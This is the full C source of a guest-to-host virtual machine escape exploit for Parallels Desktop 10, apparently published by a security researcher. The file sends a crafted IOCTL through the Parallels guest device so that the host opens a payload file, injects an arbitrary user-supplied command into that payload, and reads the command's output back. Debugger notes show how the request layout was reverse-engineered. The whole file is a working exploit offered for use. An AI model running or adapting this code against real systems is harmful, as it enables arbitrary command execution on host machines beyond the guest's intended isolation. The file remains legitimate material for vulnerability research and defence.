/*

    Guest to host VM escape exploit for Parallels Desktop.
    Tested on Parallels Desktop 10 for Mac.

    Works on all of the x86 and x64 Windows guests under the
    user accounts with any privileges level.

    Known issues:

        * Command output might be missing when running from
          low-privileged user accounts.

    Discovered by:    
    Dmytro Oleksiuk
    
    cr4sh0@gmail.com
    http://blog.cr4.sh/

*/
#include "stdafx.h"

#define IOCTL(_h_, _code_, _ib_, _il_, _ob_, _ol_)  \
                                                    \
    f_NtDeviceIoControlFile(                        \
        (_h_),                                      \
        NULL, NULL, NULL,                           \
        &StatusBlock,                               \
        (_code_),                                   \
        (PVOID)(_ib_), (DWORD)(_il_),               \
        (PVOID)(_ob_), (DWORD)(_ol_)                \
    );

#define DEVICE_NAME L"\\Device\\prl_tg"

#define IOCTL_LENGTH 0x70
#define IOCTL_CODE   0x22a004

#define PAYLOAD_NAME "TestApp.class"

#define COMMAND_DEFAUT "syslog -s -l error Never gonna give you up. Never gonna let you down."
#define COMMAND_OUTPUT "\\Temp\\prl_host_out.txt"
#define COMMAND_MARK "***command_string***"
#define COMMAND_SIZE (30 * 4)
#define COMMAND_WAIT (3 * 1000)

#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
//--------------------------------------------------------------------------------------
BOOL OpenDevice(PWSTR lpszName, HANDLE *lphDevice)
{
    DbgMsg(__FILE__, __LINE__, "Opening device \"%ws\"...\n", lpszName);

    GET_NATIVE(NtOpenFile);

    IO_STATUS_BLOCK StatusBlock;
    OBJECT_ATTRIBUTES ObjAttr;
    UNICODE_STRING usName;
    HANDLE hDevice;

    UNICODE_FROM_WCHAR(&usName, lpszName);    
    InitializeObjectAttributes(&ObjAttr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS ns = f_NtOpenFile(
        &hDevice,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        &ObjAttr,
        &StatusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(ns))
    {
        DbgMsg(__FILE__, __LINE__, "NtOpenFile() fails; status: 0x%.8x\n", ns);
        return FALSE;
    }

    *lphDevice = hDevice;

    return TRUE;
}
//--------------------------------------------------------------------------------------
/*
    Call stack to the DeviceIoControl() function call inside Parallels shell extension.
    This IOCTL request opens specified guest file at the host side.
    
        0:037> k L7
        Child-SP          RetAddr           Call Site
        00000000`12bcd1c0 00007ff9`2a016969 PrlToolsShellExt!DllUnregisterServer+0x1596
        00000000`12bcd310 00007ff9`2a01fd71 SHELL32!Ordinal93+0x225
        00000000`12bcd410 00007ff9`2a4cf03a SHELL32!SHCreateDefaultContextMenu+0x581
        00000000`12bcd780 00007ff9`2a4cc4b1 SHELL32!Ordinal927+0x156c2
        00000000`12bcdaf0 00007ff9`2a4c76f7 SHELL32!Ordinal927+0x12b39
        00000000`12bcded0 00007ff9`21d09944 SHELL32!Ordinal927+0xdd7f
        00000000`12bcdf20 00007ff9`21d059d3 explorerframe!UIItemsView::ShowContextMenu+0x298

    First 4 arguments of DeviceIoControl(), rcx - handle, r8 - input buffer, r9 - buffer len:

        0:037> r
        rax=0000000012bcd240 rbx=0000000000000000 rcx=0000000000000d74
        rdx=000000000022a004 rsi=0000000000000001 rdi=0000000000000070
        rip=00007ff918bd5b92 rsp=0000000012bcd1c0 rbp=000000000022a004
        r8=0000000012bcd240  r9=0000000000000070 r10=000000001a5bc990
        r11=000000001a5bd110 r12=0000000000000002 r13=0000000012bcd490
        r14=0000000012bcd4a0 r15=0000000016af90f0

    The rest 4 arguments of DeviceIoControl():

        0:037> dq rsp L4
        00000000`12bcd1c0  00000000`00000000 00000000`02bdc218
        00000000`12bcd1d0  00000000`00000001 00000000`00ce2480

    IOCTL request input buffer:

        0:037> dq @r8
        00000000`12bcd240  ffffffff`00008321 00000000`00010050
        00000000`12bcd250  00000000`00000001 00000000`00000002
        00000000`12bcd260  00000000`00000002 00000000`00000000
        00000000`12bcd270  00000000`00000000 00000000`00000000
        00000000`12bcd280  00000000`00000000 00000000`00000000
        00000000`12bcd290  00000000`00000000 00000000`00000000
        00000000`12bcd2a0  00000000`02c787d0 00000000`0000003c

    Pointer to the path string is at 0x60 offset:

    0:037> da poi(@r8+60)
    00000000`02c787d0  "\\psf\TC\dev\_exploits\prl_guet_"
    00000000`02c787f0  "to_host\payload\TestApp.jar"

*/
BOOL OpenFileAtTheHostSide(char *lpszFilePath)
{
    BOOL bRet = FALSE;
    HANDLE hDev = NULL;

    // get handle to the target device    
    if (OpenDevice(DEVICE_NAME, &hDev))
    {
        PDWORD64 RequestData = (PDWORD64)M_ALLOC(IOCTL_LENGTH);
        if (RequestData)
        {
            IO_STATUS_BLOCK StatusBlock;

            ZeroMemory(RequestData, IOCTL_LENGTH);

            /*
                Fill IOCTL request input buffer.
                It has the same layout on x86 and x64 versions of Windows
            */
            RequestData[0x0] = 0xffffffff00008321; // magic values
            RequestData[0x1] = 0x0000000000010050;
            RequestData[0x2] = 0x0000000000000001;
            RequestData[0x3] = 0x0000000000000002;
            RequestData[0x4] = 0x0000000000000002;
            RequestData[0xc] = (DWORD64)lpszFilePath; // file path and it's length
            RequestData[0xd] = (DWORD64)lstrlen(lpszFilePath) + 1;

            GET_NATIVE(NtDeviceIoControlFile);

            NTSTATUS ns = IOCTL(hDev, IOCTL_CODE, RequestData, IOCTL_LENGTH, RequestData, IOCTL_LENGTH);

            DbgMsg(__FILE__, __LINE__, "Device I/O control request status is 0x%.8x\n", ns);

            if (NT_SUCCESS(ns))
            {
                DbgMsg(__FILE__, __LINE__, "SUCCESS\n\n");

                bRet = TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, "FAILS\n");
            }

            M_FREE(RequestData);
        }

        CloseHandle(hDev);
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "Error while opening %ws\n", DEVICE_NAME);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
void WriteCommand(char *lpszCommand, PVOID Data, DWORD dwDataSize)
{
    for (DWORD i = 0; i < dwDataSize - COMMAND_SIZE; i += 1)
    {
        char *lpszBuff = (char *)Data + i;

        // match command buffer signature
        if (!strncmp(lpszBuff, COMMAND_MARK, strlen(COMMAND_MARK)))
        {
            memset(lpszBuff, ' ', COMMAND_SIZE);
            memcpy(lpszBuff, lpszCommand, min(COMMAND_SIZE, lstrlen(lpszCommand)));

            break;
        }
    }
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{   
    BOOL bSuccess = FALSE;
    char szPayloadPath[MAX_PATH], *lpszCommand = COMMAND_DEFAUT;

    if (argc >= 2)
    {
        lpszCommand = argv[1];

        if (strlen(lpszCommand) >= COMMAND_SIZE)
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Command is too long\n");
            return -1;
        }
    }

    DbgMsg(__FILE__, __LINE__, "Executing command: %s\n", lpszCommand);

    // get temp file path for payload
    GetTempPath(MAX_PATH, szPayloadPath);

    if (szPayloadPath[strlen(szPayloadPath) - 1] != '\\')
    {
        lstrcat(szPayloadPath, "\\");
    }

    lstrcat(szPayloadPath, PAYLOAD_NAME);

    PVOID Data = NULL;
    DWORD dwDataSize = 0;

    // query payload data
    if (GetResPayload(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_BINRES1), &Data, &dwDataSize))
    {
        DbgMsg(__FILE__, __LINE__, "Creting payload file \"%s\"...\n", szPayloadPath);

        // write command buffer into the .class file
        WriteCommand(lpszCommand, Data, dwDataSize);

        bSuccess = DumpToFile(szPayloadPath, Data, dwDataSize);        

        M_FREE(Data);
    }

    if (!bSuccess)
    {
        // error while extracting payload
        return -1;
    }

    if (OpenFileAtTheHostSide(szPayloadPath))
    {
        char szOutputPath[MAX_PATH];
        GetWindowsDirectory(szOutputPath, MAX_PATH);
        lstrcat(szOutputPath, COMMAND_OUTPUT);

        Sleep(COMMAND_WAIT);

        // read command output file
        HANDLE hFile = CreateFile(szOutputPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            DWORD dwSize = 0;
            UCHAR Buff[0x200];

            while (ReadFile(hFile, &Buff, sizeof(Buff) - 1, &dwSize, NULL) && dwSize > 0)
            {
                WriteFile(GetStdHandle(STD_OUTPUT_HANDLE), Buff, dwSize, &dwSize, NULL);
            }

            CloseHandle(hFile);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "Error %d while openinf command output file\n", GetLastError());
        }
    }

    printf("\nPress any key to quit...\n");
    _getch();

    return 0;
}
//--------------------------------------------------------------------------------------
// EoF
